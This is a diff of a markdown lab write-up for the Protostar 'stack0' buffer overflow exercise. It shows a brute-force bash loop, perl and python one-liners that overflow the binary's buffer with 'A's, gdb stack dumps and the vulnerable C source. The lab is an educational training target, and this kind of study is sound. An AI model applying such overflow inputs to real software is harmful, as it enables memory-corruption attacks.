@@ -95,7 +95,7 @@ $ ./stack0
 ss
 Try again?
 ```
-## Brute Force vulnerable code
+##### Brute Force
 ```
 #!/bin/bash
 for i in {1..70}
@@ -103,7 +103,7 @@ do
  seq -sA $i|tr -d '[:digit:]' | ./stack0
 done
 ```
-### Use codetools
+##### Leverage bash tools
 ```
 $ perl -e 'print "A"x65'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -119,9 +119,15 @@ Try again?
 
 $ python -c 'print "A"*(65)' | /opt/protostar/bin/stack0
 you have changed the 'modified' variable
+
+$ printf "%02X\n" 65
+41
+
+$ printf "%d\n" 0x5C
+92
 ```
 
-##### Start debugger
+## Debugger
 ```
 (gdb) set disassembly-flavor intel
 
@@ -183,7 +189,6 @@ Breakpoint 6 at 0x8048411: file stack0/stack0.c, line 13.
 (gdb) define hook-stop
 Type commands for definition of "hook-stop".
 End with a line saying just "end".
->info registers
 >x/24wx $esp
 >x/2i $eip
 >end
@@ -191,24 +196,6 @@ End with a line saying just "end".
 ##### Watch Stack values change
 ```
 (gdb) c
-Continuing.
-AAAAAAAAAA
-eax            0xbffffc6c	-1073742740
-ecx            0xbffffc6c	-1073742740
-edx            0xb7fd9334	-1208118476
-ebx            0xb7fd7ff4	-1208123404
-esp            0xbffffc50	0xbffffc50
-ebp            0xbffffcb8	0xbffffcb8
-esi            0x0	0
-edi            0x0	0
-eip            0x8048411	0x8048411 <main+29>
-eflags         0x200246	[ PF ZF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
 0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
 0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
 0xbffffc70:	0x41414141	0x08004141	0xbffffc88	0x080482e8
@@ -217,26 +204,7 @@ gs             0x33	51
 0xbffffca0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
 ---Type <return> to continue, or q <return> to quit---
 
-
 (gdb) c
-Continuing.
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-eax            0xbffffc6c	-1073742740
-ecx            0xbffffc6c	-1073742740
-edx            0xb7fd9334	-1208118476
-ebx            0xb7fd7ff4	-1208123404
-esp            0xbffffc50	0xbffffc50
-ebp            0xbffffcb8	0xbffffcb8
-esi            0x0	0
-edi            0x0	0
-eip            0x8048411	0x8048411 <main+29>
-eflags         0x200246	[ PF ZF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
 0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
 0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
 0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -244,9 +212,9 @@ gs             0x33	51
 0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbffffca0:	0x41414141	0x41414141	0x41414141	0x00000041
 
+RESULT // you have changed the 'modified' variable
+
 ```
-
-
 ## Source code
 ```
 #include <stdlib.h>
@@ -269,20 +237,8 @@ int main(int argc, char **argv)
 }
 
 ```
-## Summary
-Although I wanted to use `gets` and a `[ Stack ] Buffer Overflow`, you could patch out the `test` instruction with a static disassembler or at run-time with a debugger.
-
-##### Learnings
+## Learnings
  - [x] Compiler optimisation -> the compiler replaced `printf` with `puts`
  - [x] c `volatile` keyword -> tells the Compiler not to Optimise away the variable
  - [x] X86 -> `test` instruction performs a `bitwise AND` on two operands.
  - [x] X86 -> `leave` is the opposite of setting up the stack. It is an alias for `Set ESP to EBP`, then `pop EBP`.
-
-##### Appendix - Bash convert Hex to Decimal
-```
-$ printf "%02X\n" 65
-41
-
-$ printf "%d\n" 0x5C
-92
-```
